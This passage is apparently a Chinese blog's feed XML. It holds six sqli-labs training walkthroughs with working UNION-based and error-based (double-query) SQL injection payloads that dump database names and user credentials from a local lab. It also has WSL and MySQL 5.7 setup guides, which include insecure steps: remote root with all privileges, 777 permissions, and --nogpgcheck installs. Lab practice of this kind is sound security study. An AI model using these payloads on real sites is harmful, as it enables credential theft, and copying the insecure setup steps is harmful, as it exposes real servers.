        <content type="html"><![CDATA[<h1 id="sqli-labs-less6-get请求-字符型-双引号-双查询注入"><a href="#sqli-labs-less6-get请求-字符型-双引号-双查询注入" class="headerlink" title="sqli-labs-less6-get请求-字符型(双引号)-双查询注入"></a>sqli-labs-less6-get请求-字符型(双引号)-双查询注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-6/?id=1</code></p><img src="/2022/08/31/sqli-labs-less6/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&#39;</code></p><img src="/2022/08/31/sqli-labs-less6/2.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;</code></p><img src="/2022/08/31/sqli-labs-less6/3.png" class=""><p>sql语句报错，根据报错信息猜测数据库语句为<code>select * from table_name where id=&quot;input&quot;</code><br>根据页面不能回显但sql语法错误会报错的特性我们可以利用双查询注入来爆出想要的信息。<br>双查询注入爆出所有数据库名：<br><code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(14)*2))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/31/sqli-labs-less6/4.png" class=""><p>双查询注入爆出指定数据库的所有表名：<br><code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand(14)*2))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/31/sqli-labs-less6/5.png" class=""><p>双查询注入爆出指定表的所有列名：<br><code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),floor(rand(14)*2))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/31/sqli-labs-less6/6.png" class=""><p>双查询注入爆出指定表的数据：<br><code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and (select 1 from (select count(*),concat((select concat(username,&#39;^&#39;,password) from security.users limit 0,1),floor(rand(14)*2))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/31/sqli-labs-less6/7.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and (select 1 from (select count(*),concat((select concat(username,&#39;^&#39;,password) from security.users limit 1,1),floor(rand(14)*2))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/31/sqli-labs-less6/8.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less5-get请求-字符型(单引号)-双查询注入</title>
      <link href="/2022/08/30/sqli-labs-less5/"/>
      <url>/2022/08/30/sqli-labs-less5/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less5-get请求-字符型-单引号-双查询注入"><a href="#sqli-labs-less5-get请求-字符型-单引号-双查询注入" class="headerlink" title="sqli-labs-less5-get请求-字符型(单引号)-双查询注入"></a>sqli-labs-less5-get请求-字符型(单引号)-双查询注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-5/?id=1</code></p><img src="/2022/08/30/sqli-labs-less5/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-5/?id=1&#39;</code></p><img src="/2022/08/30/sqli-labs-less5/2.png" class=""><p>sql语句报错，猜测数据库语句为<code>select * from table_name where id=&#39;input&#39;</code><br>sql语句为真时显示：</p><img src="/2022/08/30/sqli-labs-less5/3.png" class=""><p>sql语句为假时显示：</p><img src="/2022/08/30/sqli-labs-less5/4.png" class=""><p>由此可以判断该页面不能回显，但是sql语句语法错误会报错，我们就可以利用sql语句语法错误会报错的特性来进行双查询(double injection)注入,通过sql报错信息来爆出我们想要的数据。<br>双查询注入爆出所有数据库名：<br><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&#39; and (select 1 from (select count(*),concat(floor(rand(14)*2),(select group_concat(schema_name) from information_schema.schemata))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/30/sqli-labs-less5/5.png" class=""><p>双查询注入爆出指定数据库的所有表名：<br><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&#39; and (select 1 from (select count(*),concat(floor(rand(14)*2),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/30/sqli-labs-less5/6.png" class=""><p>双查询注入爆出指定表的所有列名：<br><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&#39; and (select 1 from (select count(*),concat(floor(rand(14)*2),(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/30/sqli-labs-less5/7.png" class=""><p>双查询注入爆出指定表的数据：<br><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&#39; and (select 1 from (select count(*),concat(floor(rand(14)*2),(select concat(username,&#39;^&#39;,password) from users limit 0,1))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/30/sqli-labs-less5/8.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&#39; and (select 1 from (select count(*),concat(floor(rand(14)*2),(select concat(username,&#39;^&#39;,password) from users limit 1,1))x from information_schema.columns group by x)a)--+</code></p><img src="/2022/08/30/sqli-labs-less5/9.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less4-get请求-字符型(双引号)-报错注入</title>
      <link href="/2022/08/30/sqli-labs-less4/"/>
      <url>/2022/08/30/sqli-labs-less4/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less4-get请求-字符型-双引号-报错注入"><a href="#sqli-labs-less4-get请求-字符型-双引号-报错注入" class="headerlink" title="sqli-labs-less4-get请求-字符型(双引号)-报错注入"></a>sqli-labs-less4-get请求-字符型(双引号)-报错注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-4/?id=1</code></p><img src="/2022/08/30/sqli-labs-less4/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-4/?id=1&#39;</code></p><img src="/2022/08/30/sqli-labs-less4/2.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;</code></p><img src="/2022/08/30/sqli-labs-less4/3.png" class=""><p>sql语句报错，根据报错信息猜测数据库语句为<code>select * from table_name where id=(&quot;input&quot;)</code><br>order by判断列数：<br><code>http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) order by 3--+</code></p><img src="/2022/08/30/sqli-labs-less4/4.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) order by 4--+</code></p><img src="/2022/08/30/sqli-labs-less4/5.png" class=""><p>由此判断出列数为3.<br>判断可以回显的列：<br><code>http://127.0.0.1/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3--+</code></p><img src="/2022/08/30/sqli-labs-less4/6.png" class=""><p>由此判断出2，3所在的列可以回显。<br>获取所有数据库名：<br><code>http://127.0.0.1/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p><img src="/2022/08/30/sqli-labs-less4/7.png" class=""><p>获取指定数据库的所有表名：<br><code>http://127.0.0.1/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code></p><img src="/2022/08/30/sqli-labs-less4/8.png" class=""><p>获取指定表的所有列名：<br><code>http://127.0.0.1/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p><img src="/2022/08/30/sqli-labs-less4/9.png" class=""><p>获取指定表的数据：<br><code>http://127.0.0.1/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,group_concat(username,&#39;^&#39;,password) from users--+</code></p><img src="/2022/08/30/sqli-labs-less4/10.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less3-get请求-字符型(单引号变形)-报错注入</title>
      <link href="/2022/08/29/sqli-labs-less3/"/>
      <url>/2022/08/29/sqli-labs-less3/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less3-get请求-字符型-单引号变形-报错注入"><a href="#sqli-labs-less3-get请求-字符型-单引号变形-报错注入" class="headerlink" title="sqli-labs-less3-get请求-字符型(单引号变形)-报错注入"></a>sqli-labs-less3-get请求-字符型(单引号变形)-报错注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-3/?id=1</code></p><img src="/2022/08/29/sqli-labs-less3/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-3/?id=1&#39;</code></p><img src="/2022/08/29/sqli-labs-less3/2.png" class=""><p>sql语句报错，根据报错信息猜测数据库语句为<code>select * from table_name where id=(&#39;input&#39;)</code><br>order by判断列数：<br><code>http://127.0.0.1/sqli-labs/Less-3/?id=1&#39;) order by 3--+</code></p><img src="/2022/08/29/sqli-labs-less3/3.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-3/?id=1&#39;) order by 4--+</code></p><img src="/2022/08/29/sqli-labs-less3/4.png" class=""><p>由此判断出列数为3.<br>判断可回显的列：<br><code>http://127.0.0.1/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,3--+</code></p><img src="/2022/08/29/sqli-labs-less3/5.png" class=""><p>由此判断出2，3所在的列可以回显。<br>获取所有数据库名：<br><code>http://127.0.0.1/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p><img src="/2022/08/29/sqli-labs-less3/6.png" class=""><p>获取指定数据库的所有表名：<br><code>http://127.0.0.1/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code></p><img src="/2022/08/29/sqli-labs-less3/7.png" class=""><p>获取指定表的列名：<br><code>http://127.0.0.1/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p><img src="/2022/08/29/sqli-labs-less3/8.png" class=""><p>获取指定表的数据：<br><code>http://127.0.0.1/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,group_concat(username,&#39;^&#39;,password) from users--+</code></p><img src="/2022/08/29/sqli-labs-less3/9.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less2-get请求-数字型-报错注入</title>
      <link href="/2022/08/29/sqli-labs-less2/"/>
      <url>/2022/08/29/sqli-labs-less2/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less2-get请求-数字型-报错注入"><a href="#sqli-labs-less2-get请求-数字型-报错注入" class="headerlink" title="sqli-labs-less2-get请求-数字型-报错注入"></a>sqli-labs-less2-get请求-数字型-报错注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-2/?id=1</code></p><img src="/2022/08/29/sqli-labs-less2/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;</code></p><img src="/2022/08/29/sqli-labs-less2/2.png" class=""><p>sql语句报错，根据报错信息猜测数据库语句为<code>select * from table_name where id=input</code><br>order by判断列数：<br><code>http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 3</code></p><img src="/2022/08/29/sqli-labs-less2/3.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 4</code></p><img src="/2022/08/29/sqli-labs-less2/4.png" class=""><p>由此判断出列数为3.<br>判断可以回显的列：<br><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,3</code></p><img src="/2022/08/29/sqli-labs-less2/5.png" class=""><p>由此判断2,3所在的列可以回显。<br>获取所有的数据库名：<br><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata</code></p><img src="/2022/08/29/sqli-labs-less2/6.png" class=""><p>获取指定数据库的表名：<br><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p><img src="/2022/08/29/sqli-labs-less2/7.png" class=""><p>获取指定表的列名：<br><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></p><img src="/2022/08/29/sqli-labs-less2/8.png" class=""><p>获取指定表的数据：<br><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(username,&#39;^&#39;,password) from users</code></p><img src="/2022/08/29/sqli-labs-less2/9.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less1-get请求-字符型(单引号)-报错注入</title>
      <link href="/2022/08/29/sqli-labs-less1/"/>
      <url>/2022/08/29/sqli-labs-less1/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less1-get请求-字符型-单引号-报错注入"><a href="#sqli-labs-less1-get请求-字符型-单引号-报错注入" class="headerlink" title="sqli-labs-less1-get请求-字符型(单引号)-报错注入"></a>sqli-labs-less1-get请求-字符型(单引号)-报错注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-1/?id=1</code></p><img src="/2022/08/29/sqli-labs-less1/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</code></p><img src="/2022/08/29/sqli-labs-less1/2.png" class=""><p>sql语句报错，根据报错信息猜测数据库查询语句为<code>select * from table_name where id=&#39;input&#39;</code><br>order by获取列数:<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 1--+</code></p><img src="/2022/08/29/sqli-labs-less1/3.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 2--+</code></p><img src="/2022/08/29/sqli-labs-less1/4.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 3--+</code></p><img src="/2022/08/29/sqli-labs-less1/5.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 4--+</code></p><img src="/2022/08/29/sqli-labs-less1/6.png" class=""><p>由此可知列数为3。<br>获取可以回显的列：<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3--+</code></p><img src="/2022/08/29/sqli-labs-less1/7.png" class=""><p>可知，2，3所在的列可以回显。<br>获取所有数据库名：<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p><img src="/2022/08/29/sqli-labs-less1/8.png" class=""><p>获取指定数据库的表名：<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code></p><img src="/2022/08/29/sqli-labs-less1/9.png" class=""><p>获取指定表的列名：<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p><img src="/2022/08/29/sqli-labs-less1/10.png" class=""><p>获取指定表的数据：<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&#39;^&#39;,password) from users--+</code></p><img src="/2022/08/29/sqli-labs-less1/11.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows11安装linux虚拟机</title>
      <link href="/2022/08/18/windows11%E5%AE%89%E8%A3%85linux%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
      <url>/2022/08/18/windows11%E5%AE%89%E8%A3%85linux%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="windows11安装linux虚拟机"><a href="#windows11安装linux虚拟机" class="headerlink" title="windows11安装linux虚拟机"></a>windows11安装linux虚拟机</h1><p>1.检查是否打开虚拟化设置(默认开启)：<br><code>ctrl+shift+esc</code>打开任务管理器</p><img src="/2022/08/18/windows11%E5%AE%89%E8%A3%85linux%E8%99%9A%E6%8B%9F%E6%9C%BA/manager.png" class=""><p>点击性能选项，查看虚拟化设置是否开启</p><img src="/2022/08/18/windows11%E5%AE%89%E8%A3%85linux%E8%99%9A%E6%8B%9F%E6%9C%BA/virtul.png" class=""><p>如果没有打开，打开BIOS系统设置，自行配置（不同电脑进入按键不同）<br>2.打开控制面板-&gt;启用或关闭windows功能，打开<code>适用于linux的windows子系统</code>和<code>虚拟机平台</code>功能，然后重启</p><img src="/2022/08/18/windows11%E5%AE%89%E8%A3%85linux%E8%99%9A%E6%8B%9F%E6%9C%BA/control.png" class=""><p>3.下载安装linux虚拟机：<br>打开powershell,<code>wsl --list --online</code>列出要安装的版本<br><code>wsl --install -d Ubuntu-20.04</code>开始下载安装<br>如果安装中报错如下</p><img src="/2022/08/18/windows11%E5%AE%89%E8%A3%85linux%E8%99%9A%E6%8B%9F%E6%9C%BA/error.png" class=""><p>则需要下载最新的wsl安装包并运行安装，下载地址为<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi</a><br>安装完再次执行<code>wsl --install -d Ubuntu-20.04</code>即可</p>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>离线环境下centos7安装与配置mysql5.7</title>
      <link href="/2022/08/12/%E7%A6%BB%E7%BA%BF%E7%8E%AF%E5%A2%83%E4%B8%8Bcentos7%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AEmysql5-7/"/>
      <url>/2022/08/12/%E7%A6%BB%E7%BA%BF%E7%8E%AF%E5%A2%83%E4%B8%8Bcentos7%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AEmysql5-7/</url>
      
        <content type="html"><![CDATA[<h1 id="离线环境下centos7安装与配置mysql5-7"><a href="#离线环境下centos7安装与配置mysql5-7" class="headerlink" title="离线环境下centos7安装与配置mysql5.7"></a>离线环境下centos7安装与配置mysql5.7</h1><p>检查已安装的mariadb，并强制卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rpm</span> <span class="token parameter variable">-qa</span> <span class="token operator">|</span> <span class="token function">grep</span> mariadb<span class="token function">rpm</span> <span class="token parameter variable">-e</span> <span class="token parameter variable">--nodeps</span> mariadb-libs-5.5.52-1.el7.x86_64<span class="token comment">#如果存在mariadb则强制卸载</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上传mysql-5.7.xxx-x86_64.tar.gz到服务器&#x2F;usr&#x2F;local目录:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> mysql5.7.xxx.tar.gz /usr/local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加mysql组和mysql用户:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupadd</span> mysql<span class="token function">useradd</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-g</span> mysql mysql<span class="token comment"># -r 参数表示mysql用户是系统用户，不可用于登录系统;-g 参数表示把mysql用户添加到mysql用户组中。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解压mysql安装包到指定的目录 &#x2F;usr&#x2F;local:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> mysql-5.7.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将解压后的目录改名为mysql:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> mysql-5.7xxx mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更改权限:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> <span class="token parameter variable">-R</span> mysql:mysql mysql/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建配置文件<code>vim /etc/my.cnf</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>client<span class="token punctuation">]</span>default-character-set <span class="token operator">=</span> utf8mb4<span class="token comment">#设置mysql客户端默认字符集,如果不设置会报错ERROR 2002 (HY000): Can't connect to local MySQL server through socket</span><span class="token assign-left variable">socket</span><span class="token operator">=</span>/data/mysql57/data/mysql.sock<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span><span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">3306</span><span class="token comment">#设置3306端口</span>character-set-server <span class="token operator">=</span> utf8mb4<span class="token assign-left variable">basedir</span><span class="token operator">=</span>/usr/local/mysql<span class="token comment">#设置mysql的安装目录</span><span class="token assign-left variable">datadir</span><span class="token operator">=</span>/data/mysql57/data<span class="token comment">#设置mysql数据库的数据的存放目录</span><span class="token assign-left variable">socket</span><span class="token operator">=</span>/data/mysql57/data/mysql.sockskip-name-resolve<span class="token comment">#禁用主机名解析</span>default-storage-engine<span class="token operator">=</span>INNODB<span class="token comment">#创建新表时将使用的默认存储引擎</span><span class="token assign-left variable">lower_case_table_names</span><span class="token operator">=</span><span class="token number">1</span>max_allowed_packet <span class="token operator">=</span> 256M<span class="token comment">#过小可能会导致写入(导入)数据失败</span>group_concat_max_len <span class="token operator">=</span> <span class="token number">10240</span><span class="token assign-left variable">max_connections</span><span class="token operator">=</span><span class="token number">200</span><span class="token comment">#允许最大连接数</span>join_buffer_size <span class="token operator">=</span> 16M<span class="token comment">#提到 join 的效率</span>innodb_log_file_size <span class="token operator">=</span> 256M<span class="token comment">#事务日志大小</span>innodb_log_buffer_size <span class="token operator">=</span> 4M<span class="token comment">#日志缓冲区大小</span>innodb_log_buffer_size <span class="token operator">=</span> 3M<span class="token comment">#事务在内存中的缓冲</span><span class="token punctuation">[</span>mysqldump<span class="token punctuation">]</span>quick<span class="token comment">#开启快速导出</span>default-character-set <span class="token operator">=</span> utf8mb4max_allowed_packet <span class="token operator">=</span> 256M<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>递归创建目录:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /data/mysql57/data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更改权限:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> <span class="token parameter variable">-R</span> mysql:mysql /data/mysql57/data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>初始化数据库，记下最后一行的密码（牢记初次登录需要）:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/mysqld <span class="token parameter variable">--initialize</span> <span class="token parameter variable">--user</span><span class="token operator">=</span>mysql <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr/local/mysql <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/data/mysql57/data<span class="token comment">#注：如果初始化失败，即给上层目录mysql57 777权限即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>源目录启动数据库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/local/mysql/support-files/mysql.server start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置自动启动mysql:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/local/mysql/support-files/mysql.server /etc/rc.d/init.d/mysqld<span class="token comment">#复制启动脚本到资源目录</span><span class="token function">chmod</span> +x /etc/rc.d/init.d/mysqld<span class="token comment">#增加mysqld服务控制脚本执行权限</span><span class="token function">chkconfig</span> <span class="token parameter variable">--add</span> mysqld<span class="token comment">#将mysqld添加到系统服务</span><span class="token function">chkconfig</span> <span class="token parameter variable">--list</span> mysqld<span class="token comment">#检查mysqld是否生效</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>启动mysql服务:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> mysqld start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>建立一个链接文件,因为系统默认会查找&#x2F;usr&#x2F;bin下的命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/mysql/bin/mysql /usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录mysql:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改root密码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> password <span class="token keyword">for</span> root@localhost<span class="token operator">=</span>password<span class="token punctuation">(</span><span class="token string">"用户新密码"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置root远程登录:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GRANT ALL PRIVILEGES ON *.* TO<span class="token string">'root'</span>@<span class="token string">'%'</span> IDENTIFIED BY <span class="token string">'用户密码'</span> WITH GRANT OPTION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新权限:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FLUSH PRIVILEGES<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络环境中centos7安装与配置mysql5.7</title>
      <link href="/2022/08/12/%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%ADcentos7%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AEmysql5.7/"/>
      <url>/2022/08/12/%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%ADcentos7%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AEmysql5.7/</url>
      
        <content type="html"><![CDATA[<h1 id="网络环境中centos7安装与配置mysql5-7"><a href="#网络环境中centos7安装与配置mysql5-7" class="headerlink" title="网络环境中centos7安装与配置mysql5.7"></a>网络环境中centos7安装与配置mysql5.7</h1><p>检查已安装的mariadb，并强制卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rpm</span> <span class="token parameter variable">-qa</span> <span class="token operator">|</span> <span class="token function">grep</span> mariadb<span class="token comment">#查看是否安装了mariadb</span><span class="token function">rpm</span> <span class="token parameter variable">-e</span> <span class="token parameter variable">--nodeps</span> mariadb-libs-5.5.52-1.el7.x86_64<span class="token comment">#如果已安装了mariadb，则强制卸载</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下载mysql5.7源的rpm包:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-c</span> http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装mysql5.7的rpm源:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token parameter variable">-y</span> <span class="token function">install</span> mysql57-community-release-el7-10.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装mysql5.7:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token parameter variable">-y</span> <span class="token function">install</span> mysql-community-server <span class="token parameter variable">--nogpgcheck</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动mysql:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start mysqld.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看mysql启动状态:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status mysqld.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看mysql初始密码:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /var/log/mysqld.log <span class="token operator">|</span> <span class="token function">grep</span> password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录mysql:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更改mysql root密码:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alter user <span class="token string">'root'</span>@<span class="token string">'localhost'</span> identified by <span class="token string">'xxxx'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置mysql root远程登录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">update user <span class="token builtin class-name">set</span> <span class="token function">host</span> <span class="token operator">=</span> <span class="token 